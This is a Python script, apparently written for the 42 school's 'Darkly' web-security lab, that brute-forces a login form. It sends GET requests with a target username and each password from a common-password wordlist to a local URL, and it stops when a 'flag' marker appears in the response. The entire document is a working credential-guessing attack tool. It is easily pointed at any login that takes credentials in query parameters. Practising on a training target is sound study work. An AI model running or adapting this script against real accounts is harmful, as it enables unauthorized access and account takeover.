#!/usr/bin/env python3
import argparse
from pathlib import Path
from typing import Optional

import requests

# python3 bruteforce.py \
#     -u "http://localhost:8080/index.php" \
#     -n "admin" \
#     -w "10k-most-common.txt" \
#     -m "flag"

def try_login(
    session: requests.Session,
    base_url: str,
    username: str,
    password: str,
    timeout: float = 3.0,
) -> Optional[str]:
    params = {
        "page": "signin",
        "username": username,
        "password": password,
        "Login": "Login",
    }
    try:
        resp = session.get(base_url, params=params, timeout=timeout)
        return resp.text
    except requests.RequestException as e:
        print(f"[!] Request error for password '{password}': {e}")
        return None


def brute_force(
    base_url: str,
    username: str,
    wordlist_path: Path,
    success_marker: str,
) -> None:
    if not wordlist_path.is_file():
        print(f"[!] Wordlist not found: {wordlist_path}")
        return

    print(f"[*] Target URL:    {base_url}")
    print(f"[*] Username:      {username}")
    print(f"[*] Wordlist:      {wordlist_path}")
    print(f"[*] Success marker: {success_marker!r}")
    print()

    tried = 0

    with requests.Session() as session, \
            wordlist_path.open("r", encoding="utf-8", errors="ignore") as f:

        for raw in f:
            password = raw.strip()
            if not password:
                continue

            tried += 1
            if tried % 100 == 1:
                print(f"[*] Attempt #{tried}: '{password}'")

            page = try_login(session, base_url, username, password)
            if page is None:
                continue

            if success_marker.lower() in page.lower():
                idx = page.lower().find(success_marker.lower())
                snippet = page[idx:idx + 200]
                print(f"\n[+] Flag found!")
                print(f"[+] Password: '{password}'")
                print(f"[+] Response snippet:\n{snippet}")
                return

    print("\n[!] Exhausted all passwords. Flag not found.")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Login brute-forcer for Darkly (42 project)."
    )
    parser.add_argument(
        "-u", "--url",
        default="http://localhost:8080/index.php",
        help="base URL (default: %(default)s)",
    )
    parser.add_argument(
        "-n", "--username",
        default="admin",
        help="username to attack (default: %(default)s)",
    )
    parser.add_argument(
        "-w", "--wordlist",
        default="10k-most-common.txt",
        help="path to password wordlist (default: %(default)s)",
    )
    parser.add_argument(
        "-m", "--marker",
        default="flag",
        help="string to look for in response (default: %(default)s)",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    try:
        brute_force(
            base_url=args.url,
            username=args.username,
            wordlist_path=Path(args.wordlist),
            success_marker=args.marker,
        )
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")


if __name__ == "__main__":
    main()


